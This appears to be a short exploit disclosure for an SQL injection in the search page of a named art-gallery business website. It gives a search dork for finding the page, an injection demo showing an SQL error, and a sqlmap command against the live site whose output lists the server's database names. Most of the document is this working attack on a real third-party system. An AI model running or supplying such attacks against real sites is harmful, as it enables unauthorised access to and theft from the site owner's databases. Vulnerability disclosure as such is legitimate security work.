# issue_20190602
PoC   sqlmap.py -u "http://haddadsfinearts.com/search.php?id=02" --text-only  --random-agent --dbs

# Exploit Title:Haddad's Fine SQL Injection
--------------------------------------------------------------------------------------------------------
# Date:29.05.2019
--------------------------------------------------------------------------------------------------------

# Dork :intitle:"Haddad's Fine Arts - Search"
--------------------------------------------------------------------------------------------------------

# Exploit Author:江苏天网计算机技术有限公司
--------------------------------------------------------------------------------------------------------

# Tested on:Windows &Kali Linux
--------------------------------------------------------------------------------------------------------

#Demo:

http://haddadsfinearts.com/search.php?id=02'
You have an error in your SQL syntax

--------------------------------------------------------------------------------------------------------


PoC 

sqlmap.py -u "http://haddadsfinearts.com/search.php?id=02" --text-only  --random-agent --dbs

[*] creativeart
[*] curatedimage
[*] giclee
[*] gicleephoto
[*] gicleestudio
[*] haddads
[*] haddadsfinearts
[*] information_schema
[*] mysql
[*] ofmaker
[*] performance_schema
[*] photo_canvas
[*] photocanvas
